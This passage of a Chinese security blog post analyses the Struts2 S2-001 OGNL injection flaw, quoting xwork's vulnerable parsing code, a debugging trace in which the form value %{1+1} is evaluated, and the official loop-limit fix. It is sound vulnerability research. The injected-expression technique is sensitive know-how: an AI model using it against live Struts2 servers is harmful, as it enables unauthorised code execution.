是一个选择操作符，后面则是选择用的逻辑表达式。而选择操作符有三种：</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> ? 选择满足条件的所有元素</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> ^ 选择满足条件的第一个元素</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> $ 选择满足条件的最后一个元素</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> 例如：group.userList.&#123;? <span class="comment">#txxx.xxx != null&#125;将获得某个group中user的name不为空的user的列表。</span></span></span><br><span class="line"><span class="meta">&gt;</span></span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>struts2中大量用到了这种OGNL表达式，正是由于有这种功能强大的表达式，只要当传入解析的表达式我们可以控制的时候，就可以触发漏洞。</p>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>可以锁定到最终变量值发生变化的区域是在<code>xwork-2.0.3.jar!/com/opensymphony/xwork2/util/TextParseUtil.class:30 line</code>中</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">translateVariables</span><span class="params">(<span class="keyword">char</span> open, String expression, ValueStack stack, Class asType, TextParseUtil.ParsedValueEvaluator evaluator)</span> </span>&#123;</span><br><span class="line">    Object result = expression;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="keyword">true</span>) &#123;</span><br><span class="line">        <span class="keyword">int</span> start = expression.indexOf(open + <span class="string">"&#123;"</span>);</span><br><span class="line">        <span class="keyword">int</span> length = expression.length();</span><br><span class="line">        <span class="keyword">int</span> x = start + <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">int</span> count = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(start != -<span class="number">1</span> &amp;&amp; x &lt; length &amp;&amp; count != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">char</span> c = expression.charAt(x++);</span><br><span class="line">            <span class="keyword">if</span> (c == <span class="string">'&#123;'</span>) &#123;</span><br><span class="line">                ++count;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c == <span class="string">'&#125;'</span>) &#123;</span><br><span class="line">                --count;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> end = x - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (start == -<span class="number">1</span> || end == -<span class="number">1</span> || count != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> XWorkConverter.getInstance().convertValue(stack.getContext(), result, asType);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        String <span class="keyword">var</span> = expression.substring(start + <span class="number">2</span>, end);</span><br><span class="line">        Object o = stack.findValue(<span class="keyword">var</span>, asType);</span><br><span class="line">        <span class="keyword">if</span> (evaluator != <span class="keyword">null</span>) &#123;</span><br><span class="line">            o = evaluator.evaluate(o);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        String left = expression.substring(<span class="number">0</span>, start);</span><br><span class="line">        String right = expression.substring(end + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (o != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (TextUtils.stringSet(left)) &#123;</span><br><span class="line">                result = left + o;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                result = o;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (TextUtils.stringSet(right)) &#123;</span><br><span class="line">                result = result + right;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            expression = left + o + right;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            result = left + right;</span><br><span class="line">            expression = left + right;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在此处下了断点之后，可以看到</p>
+<p>依次进入了好几次，不同时候的<code>expression</code>的值都会有所不同，我们找到值为<code>password</code>时开始分析</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/从零开始学习struts2-S2-001/13.png" alt></p>
+<p>经过两次如下代码之后，将其生成了OGNL表达式，返回了<code>%{password}</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> XWorkConverter.getInstance().convertValue(stack.getContext(), result, asType);</span><br></pre></td></tr></table></figure>
+<p>然后这次的判断跳过了中间的return，来到后面，取出<code>%{password}</code>中间的值<code>password</code>赋给<code>var</code></p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/从零开始学习struts2-S2-001/15.png" alt></p>
+<p>然后通过<code>Object o = stack.findValue(var, asType)</code>获得到password的值为<code>%{1+1}</code></p>
+<p>然后重新赋值给expression，进行下一次循环</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/从零开始学习struts2-S2-001/16.png" alt></p>
+<p>在这一次循环的时候，就再次解析了<code>%{1+1}</code>这个OGNL表达式，并将其赋值给了<code>o</code></p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/从零开始学习struts2-S2-001/17.png" alt></p>
+<p>最后<code>expression</code>的值就变成了2，不是OGNL表达式时就会进入</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> XWorkConverter.getInstance().convertValue(stack.getContext(), result, asType);</span><br></pre></td></tr></table></figure>
+<p>最后返回并显示在表单中</p>
+<h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><p>通过之前的漏洞分析可以看到，由于struts2错误的使用了递归来进行验证，导致OGNL表达式的执行</p>
+<p>官方给出的修复</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">translateVariables</span><span class="params">(<span class="keyword">char</span> open, String expression, ValueStack stack, Class asType, ParsedValueEvaluator evaluator, <span class="keyword">int</span> maxLoopCount)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// deal with the "pure" expressions first!</span></span><br><span class="line">    <span class="comment">//expression = expression.trim();</span></span><br><span class="line">    Object result = expression;</span><br><span class="line">    <span class="keyword">int</span> loopCount = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> pos = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">int</span> start = expression.indexOf(open + <span class="string">"&#123;"</span>, pos);</span><br><span class="line">        <span class="keyword">if</span> (start == -<span class="number">1</span>) &#123;</span><br><span class="line">            pos = <span class="number">0</span>;</span><br><span class="line">            loopCount++;</span><br><span class="line">            start = expression.indexOf(open + <span class="string">"&#123;"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (loopCount &gt; maxLoopCount) &#123;</span><br><span class="line">            <span class="comment">// translateVariables prevent infinite loop / expression recursive evaluation</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> length = expression.length();</span><br><span class="line">        <span class="keyword">int</span> x = start + <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">int</span> end;</span><br><span class="line">        <span class="keyword">char</span> c;</span><br><span class="line">        <span class="keyword">int</span> count = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (start != -<span class="number">1</span> &amp;&amp; x &lt; length &amp;&amp; count != <span class="number">0</span>) &#123;</span><br><span class="line">            c = expression.charAt(x++);</span><br><span class="line">            <span class="keyword">if</span> (c == <span class="string">'&#123;'</span>) &#123;</span><br><span class="line">                count++;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c == <span class="string">'&#125;'</span>) &#123;</span><br><span class="line">                count--;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        end = x - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((start != -<span class="number">1</span>) &amp;&amp; (end != -<span class="number">1</span>) &amp;&amp; (count == <span class="number">0</span>)) &#123;</span><br><span class="line">            String <span class="keyword">var</span> = expression.substring(start + <span class="number">2</span>, end);</span><br><span class="line"></span><br><span class="line">            Object o = stack.findValue(<span class="keyword">var</span>, asType);</span><br><span class="line">            <span class="keyword">if</span> (evaluator != <span class="keyword">null</span>) &#123;</span><br><span class="line">            	o = evaluator.evaluate(o);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line"></span><br><span class="line">            String left = expression.substring(<span class="number">0</span>, start);</span><br><span class="line">            String right = expression.substring(end + <span class="number">1</span>);</span><br><span class="line">            String middle = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">if</span> (o != <span class="keyword">null</span>) &#123;</span><br><span class="line">                middle = o.toString();</span><br><span class="line">                <span class="keyword">if</span> (!TextUtils.stringSet(left)) &#123;</span><br><span class="line">                    result = o;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    result = left + middle;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (TextUtils.stringSet(right)) &#123;</span><br><span class="line">                    result = result + right;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                expression = left + middle + right;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// the variable doesn't exist, so don't display anything</span></span><br><span class="line">                result = left + right;</span><br><span class="line">                expression = left + right;</span><br><span class="line">            &#125;</span><br><span class="line">            pos = (left != <span class="keyword">null</span> &amp;&amp; left.length() &gt; <span class="number">0</span> ? left.length() - <span class="number">1</span>: <span class="number">0</span>) +</span><br><span class="line">                  (middle != <span class="keyword">null</span> &amp;&amp; middle.length() &gt; <span class="number">0</span> ? middle.length() - <span class="number">1</span>: <span class="number">0</span>) +</span><br><span class="line">                  <span class="number">1</span>;</span><br><span class="line">            pos = Math.max(pos, <span class="number">1</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> XWorkConverter.getInstance().convertValue(stack.getContext(), result, asType);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以明显看到多了这样的判断</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (loopCount &gt; maxLoopCount) &#123;</span><br><span class="line">    <span class="comment">// translateVariables prevent infinite loop / expression recursive evaluation</span></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>判断了循环的次数，从而在解析到<code>%{1+1}</code>的时候不会继续向下递归</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>漏洞的形成确实不算是特别难，但是由于对于java的不熟悉，以及一些搭建配置的问题，导致还是花费了很多精力和时间去完成这个漏洞分析和复现的。正面刚java确实有点脑壳疼，暑假还剩下这几天，再多复现几个漏洞把。。</p>
+<h1 id="Reference-Links"><a href="#Reference-Links" class="headerlink" title="Reference Links"></a>Reference Links</h1><p><a href="https://chybeta.github.io/2018/02/06/【struts2-命令-代码执行漏洞分析系列】S2-001/" target="_blank" rel="noopener">https://chybeta.github.io/2018/02/06/【struts2-命令-代码执行漏洞分析系列】S2-001/</a></p>
+<p><a href="http://www.zerokeeper.com/vul-analysis/struts2-command-execution-series-review.html" target="_blank" rel="noopener">http://www.zerokeeper.com/vul-analysis/struts2-command-execution-series-review.html</a></p>
+<p><a href="https://www.codemonster.cn/2018/03/28/2018-struts2-001/" target="_blank" rel="noopener">https://www.codemonster.cn/2018/03/28/2018-struts2-001/</a></p>
+<p><a href="https://github.com/vulhub/vulhub" target="_blank" rel="noopener">https://github.com/vulhub/vulhub</a></p>
+
+
+                <hr>
+
+                
+
+                <ul class="pager">
+                    
+                        <li class="previous">
+                            <a href="/2018/08/Struts2-命令-代码执行漏洞分析系列 S2-007/" data-toggle="tooltip" data-placement="top" title="【Struts2-命令-代码执行漏洞分析系列】S2-007">&larr; Previous Post</a>
+                        </li>
+                    
+                    
+                        <li class="next">
+                            <a href="/2018/08/Discuz漏洞分析/" data-toggle="tooltip" data-placement="top" title="Discuz漏洞分析">Next Post &rarr;</a>
+                        </li>
+                    
+                </ul>
+
+                
+
+                
+
+            </div>
+    <!-- Side Catalog Container -->
+        
+
+    <!-- Sidebar Container -->
+
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+                <section>
+                    <!-- no hr -->
+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+                       
+                          <a class="tag" href="/tags/#java" title="java">java</a>
+                        
+                          <a class="tag" href="/tags/#漏洞分析" title="漏洞分析">漏洞分析</a>
+                        
+                          <a class="tag" href="/tags/#struts2" title="struts2">struts2</a>
+                        
+                    </div>
+                </section>
+                
+
+                <!-- Friends Blog -->
+                
+                <hr>
+                <h5>FRIENDS</h5>
+                <ul class="list-inline">
+
+                    
+                        <li><a href="//98587329.github.io" target="_blank">mt</a></li>
+                    
+                        <li><a href="//www.cflowerth.com" target="_blank">FAtwAER</a></li>
+                    
+                        <li><a href="//lufe1.cn" target="_blank">lufei</a></li>
+                    
+                        <li><a href="//0x3f97.github.io" target="_blank">gd</a></li>
+                    
+                        <li><a href="http://www.lsafe.org" target="_blank">4dmin$5</a></li>
+                    
+                        <li><a href="http://www.thekingofnight.com/" target="_blank">theKingOfNight</a></li>
+                    
+                        <li><a href="http://www.thekingofnight.com/" target="_blank">Hpdoger</a></li>
+                    
+                        <li><a href="//mochazz.github.io/" target="_blank">七月火</a></li>
+                    
+                        <li><a href="https://mengsec.com/" target="_blank">蒙尘</a></li>
+                    
+                        <li><a href="https://patrilic.top/" target="_blank">Patrilic&#39;s Blog</a></li>
+                    
+                </ul>
+                
+            </div>
+
+        </div>
+    </div>
+</article>
+
+
+
+
+
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
+<script>
+    async("https://cdn.bootcss.com/anchor-js/1.1.1/anchor.min.js",function(){
+        anchors.options = {
+          visible: 'always',
+          placement: 'right',
+          icon: '#'
+        };
+        anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
+    })
+</script>
+<style>
+    /* place left on bigger screen */
+    @media all and (min-width: 800px) {
+        .anchorjs-link{
+            position: absolute;
+            left: -0.75em;
+            font-size: 1.1em;
+            margin-top : -0.1em;
+        }
+    }
+</style>
+
+
+
+    <!-- Footer -->
+    <!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+                
+                
+                
+
+                
+
+                
+
+                
+                    <li>
+                        <a target="_blank"  href="https://github.com/kingkaki">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                </ul>
+                <p class="copyright text-muted">
+                    Copyright &copy; Kingkk&#39;s Blog 2019 
+                    <br>
+                    Theme by <a href="http://huangxuan.me">Hux</a> 
+                    <span style="display: inline-block; margin: 0 5px;">
+                        <i class="fa fa-heart"></i>
+                    </span> 
+                    Ported by <a href="http://blog.kaijun.rocks">Kaijun</a> <!-- | 
+                    <iframe
+                        style="margin-left: 2px; margin-bottom:-5px;"
+                        frameborder="0" scrolling="0" width="91px" height="20px"
+                        src="https://ghbtns.com/github-btn.html?user=kaijun&repo=hexo-theme-huxblog&type=star&count=true" >
+                    </iframe>
+                    -->
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- jQuery -->
+<script src="/js/jquery.min.js"></script>
+
+<!-- Bootstrap Core JavaScript -->
+<script src="/js/bootstrap.min.js"></script>
+
+<!-- Custom Theme JavaScript -->
+<script src="/js/hux-blog.min.js"></script>
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+<!-- 
+     Because of the native support for backtick-style fenced code blocks 
+     right within the Markdown is landed in Github Pages, 
+     From V1.6, There is no need for Highlight.js, 
+     so Huxblog drops it officially.
+
+     - https://github.com/blog/2100-github-pages-now-faster-and-simpler-with-jekyll-3-0  
+     - https://help.github.com/articles/creating-and-highlighting-code-blocks/    
+-->
+<!--
+    <script>
+        async("http://cdn.bootcss.com/highlight.js/8.6/highlight.min.js", function(){
+            hljs.initHighlightingOnLoad();
+        })
+    </script>
+    <link href="http://cdn.bootcss.com/highlight.js/8.6/styles/github.min.css" rel="stylesheet">
+-->
+
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async("https://www.kingkk/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("https://cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+<!-- Google Analytics -->
+
+
+
+
+<!-- Baidu Tongji -->
+
+<script>
+    // dynamic User by Hux
+    var _baId = '2095437387a20021fd7e176e0c1aac8b';
+
+    // Originial
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?" + _baId;
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+</script>
+
+
+<!-- Side Catalog -->
+
+
+
+
+
+<!-- Image to hack wechat -->
+<img src="https://www.kingkk/img/icon_wechat.png" width="0" height="0" />
+<!-- Migrate from head to bottom, no longer block render and still work -->
+
+</body>
+
+</html>
